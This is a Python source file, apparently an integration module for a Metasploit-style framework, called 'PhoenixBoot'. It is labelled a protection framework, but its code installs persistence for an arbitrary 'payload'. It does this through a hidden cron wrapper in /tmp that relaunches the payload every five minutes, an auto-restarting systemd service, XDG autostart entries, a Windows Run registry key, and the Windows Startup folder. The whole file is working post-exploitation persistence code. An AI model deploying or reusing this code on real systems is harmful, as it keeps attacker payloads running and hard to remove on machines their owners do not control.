#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
PhoenixBoot Integration

PhoenixBoot is a protection and persistence framework.
This integration provides defensive capabilities and persistence mechanisms.

Author: P4x-ng
License: MSF_LICENSE
"""

import os
import sys
import hashlib
import json
import time
from typing import Dict, List, Optional, Tuple
from datetime import datetime, timedelta

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(__file__)))))

from lib.msf.core.integrations import BaseIntegration, IntegrationRegistry


class PhoenixBootIntegration(BaseIntegration):
    """
    Integration for PhoenixBoot protection framework.
    
    PhoenixBoot provides capabilities for:
    - Persistence mechanisms
    - Self-healing and recovery
    - Process monitoring and restart
    - Configuration backup and restore
    - Defensive countermeasures
    """
    
    def __init__(self, config=None):
        """Initialize PhoenixBoot integration."""
        super().__init__(config)
        self.name = "PhoenixBoot"
        self.state_file = self.config.get('state_file', '/tmp/.phoenixboot_state.json')
        self.protected_processes = []
        
    def check_dependencies(self) -> Tuple[bool, List[str]]:
        """
        Check PhoenixBoot dependencies.
        
        Returns:
            tuple: (success, missing_dependencies)
        """
        missing = []
        
        # Check write permissions for state file
        state_dir = os.path.dirname(self.state_file)
        if not os.access(state_dir, os.W_OK):
            missing.append(f'Write access to {state_dir}')
        
        # Check if running with sufficient privileges for persistence
        try:
            if hasattr(os, 'getuid') and os.getuid() != 0 and sys.platform != 'win32':
                # Non-root on Unix - limited capabilities
                pass  # Still functional, just limited
        except AttributeError:
            # Windows doesn't have getuid
            pass
        
        return (len(missing) == 0, missing)
    
    def initialize(self) -> bool:
        """
        Initialize PhoenixBoot integration.
        
        Returns:
            bool: True if initialization succeeded
        """
        success, missing = self.check_dependencies()
        
        if not success:
            print(f"Warning: PhoenixBoot dependencies missing: {missing}")
            # Continue anyway with limited functionality
        
        # Load existing state if available
        self._load_state()
        
        self.enabled = True
        return True
    
    def _load_state(self):
        """Load PhoenixBoot state from disk."""
        if os.path.exists(self.state_file):
            try:
                with open(self.state_file, 'r') as f:
                    state = json.load(f)
                    self.protected_processes = state.get('protected_processes', [])
            except Exception as e:
                print(f"Warning: Could not load PhoenixBoot state: {e}")
    
    def _save_state(self):
        """Save PhoenixBoot state to disk."""
        try:
            state = {
                'protected_processes': self.protected_processes,
                'last_update': datetime.now().isoformat()
            }
            with open(self.state_file, 'w') as f:
                json.dump(state, f, indent=2)
        except Exception as e:
            print(f"Warning: Could not save PhoenixBoot state: {e}")
    
    def add_persistence(self, payload_path: str, method: str = 'auto') -> Dict:
        """
        Add persistence mechanism for a payload.
        
        Args:
            payload_path (str): Path to payload to persist
            method (str): Persistence method (auto, cron, systemd, startup, registry)
            
        Returns:
            dict: Result dictionary
        """
        result = {
            'success': False,
            'method': method,
            'payload': payload_path
        }
        
        if not os.path.exists(payload_path):
            result['error'] = f'Payload not found: {payload_path}'
            return result
        
        # Detect platform and apply appropriate persistence
        if sys.platform == 'linux' or sys.platform == 'darwin':
            if method == 'auto':
                method = 'cron' if os.path.exists('/usr/bin/crontab') else 'startup'
            
            if method == 'cron':
                return self._add_cron_persistence(payload_path)
            elif method == 'systemd':
                return self._add_systemd_persistence(payload_path)
            elif method == 'startup':
                return self._add_startup_persistence(payload_path)
        
        elif sys.platform == 'win32':
            if method == 'auto':
                method = 'registry'
            
            if method == 'registry':
                return self._add_registry_persistence(payload_path)
            elif method == 'startup':
                return self._add_windows_startup_persistence(payload_path)
        
        result['error'] = f'Unsupported method: {method}'
        return result
    
    def _add_cron_persistence(self, payload_path: str) -> Dict:
        """Add cron-based persistence."""
        import subprocess
        
        result = {'success': False, 'method': 'cron'}
        
        try:
            # Create wrapper script
            wrapper_script = f'/tmp/.phoenix_{hashlib.md5(payload_path.encode()).hexdigest()[:8]}.sh'
            
            with open(wrapper_script, 'w') as f:
                f.write(f'''#!/bin/bash
# PhoenixBoot persistence wrapper
if ! pgrep -f "{payload_path}" > /dev/null; then
    {payload_path} &
fi
''')
            
            os.chmod(wrapper_script, 0o755)
            
            # Add to crontab
            cron_entry = f"*/5 * * * * {wrapper_script}\n"
            
            # Get existing crontab
            proc = subprocess.run(['crontab', '-l'], 
                                capture_output=True, text=True)
            
            existing_cron = proc.stdout if proc.returncode == 0 else ''
            
            if wrapper_script not in existing_cron:
                new_cron = existing_cron + cron_entry
                proc = subprocess.run(['crontab', '-'], 
                                    input=new_cron, text=True,
                                    capture_output=True)
                
                result['success'] = proc.returncode == 0
                result['wrapper'] = wrapper_script
        
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def _add_systemd_persistence(self, payload_path: str) -> Dict:
        """Add systemd service persistence."""
        result = {'success': False, 'method': 'systemd'}
        
        if hasattr(os, 'getuid') and os.getuid() != 0:
            result['error'] = 'Root privileges required for systemd persistence'
            return result
        
        try:
            service_name = f'phoenix-{hashlib.md5(payload_path.encode()).hexdigest()[:8]}'
            service_file = f'/etc/systemd/system/{service_name}.service'
            
            service_content = f'''[Unit]
Description=PhoenixBoot Protected Service
After=network.target

[Service]
Type=simple
ExecStart={payload_path}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
'''
            
            with open(service_file, 'w') as f:
                f.write(service_content)
            
            import subprocess
            subprocess.run(['systemctl', 'daemon-reload'])
            subprocess.run(['systemctl', 'enable', service_name])
            subprocess.run(['systemctl', 'start', service_name])
            
            result['success'] = True
            result['service'] = service_name
        
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def _add_startup_persistence(self, payload_path: str) -> Dict:
        """Add startup script persistence (Unix)."""
        result = {'success': False, 'method': 'startup'}
        
        # Try user-level startup
        startup_dirs = [
            os.path.expanduser('~/.config/autostart'),
            os.path.expanduser('~/.local/share/autostart')
        ]
        
        for startup_dir in startup_dirs:
            if os.path.exists(startup_dir) or os.path.exists(os.path.dirname(startup_dir)):
                try:
                    os.makedirs(startup_dir, exist_ok=True)
                    
                    desktop_file = os.path.join(
                        startup_dir,
                        f'phoenix-{hashlib.md5(payload_path.encode()).hexdigest()[:8]}.desktop'
                    )
                    
                    with open(desktop_file, 'w') as f:
                        f.write(f'''[Desktop Entry]
Type=Application
Name=Phoenix Protected Service
Exec={payload_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
''')
                    
                    result['success'] = True
                    result['desktop_file'] = desktop_file
                    break
                
                except Exception as e:
                    result['error'] = str(e)
        
        return result
    
    def _add_registry_persistence(self, payload_path: str) -> Dict:
        """Add Windows registry persistence."""
        result = {'success': False, 'method': 'registry'}
        
        try:
            import winreg
            
            # Add to Run key
            key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, 
                                winreg.KEY_SET_VALUE)
            
            value_name = f'Phoenix{hashlib.md5(payload_path.encode()).hexdigest()[:8]}'
            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, payload_path)
            winreg.CloseKey(key)
            
            result['success'] = True
            result['key'] = f'HKCU\\{key_path}\\{value_name}'
        
        except ImportError:
            result['error'] = 'Not on Windows platform'
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def _add_windows_startup_persistence(self, payload_path: str) -> Dict:
        """Add Windows startup folder persistence."""
        result = {'success': False, 'method': 'startup'}
        
        try:
            startup_folder = os.path.join(
                os.environ['APPDATA'],
                'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
            )
            
            if os.path.exists(startup_folder):
                import shutil
                dest = os.path.join(
                    startup_folder,
                    os.path.basename(payload_path)
                )
                shutil.copy2(payload_path, dest)
                
                result['success'] = True
                result['path'] = dest
        
        except Exception as e:
            result['error'] = str(e)
        
        return result
    
    def execute(self, action: str, **kwargs) -> Dict:
        """
        Execute PhoenixBoot action.
        
        Args:
            action (str): Action to perform
            **kwargs: Additional parameters
            
        Returns:
            dict: Results dictionary
        """
        if not self.enabled:
            return {'success': False, 'error': 'PhoenixBoot not initialized'}
        
        if action == 'add_persistence':
            return self.add_persistence(
                kwargs.get('payload'),
                kwargs.get('method', 'auto')
            )
        
        elif action == 'list_protected':
            return {
                'success': True,
                'protected': self.protected_processes
            }
        
        return {'success': False, 'error': f'Unknown action: {action}'}
    
    def cleanup(self):
        """Clean up PhoenixBoot resources."""
        self._save_state()
        self.enabled = False


# Register the integration
IntegrationRegistry.register('phoenixboot', PhoenixBootIntegration)


if __name__ == '__main__':
    # Test the integration
    phoenixboot = PhoenixBootIntegration()
    
    if phoenixboot.initialize():
        print("PhoenixBoot initialized successfully")
        result = phoenixboot.execute('list_protected')
        print(f"Protected processes: {result.get('protected', [])}")
        phoenixboot.cleanup()
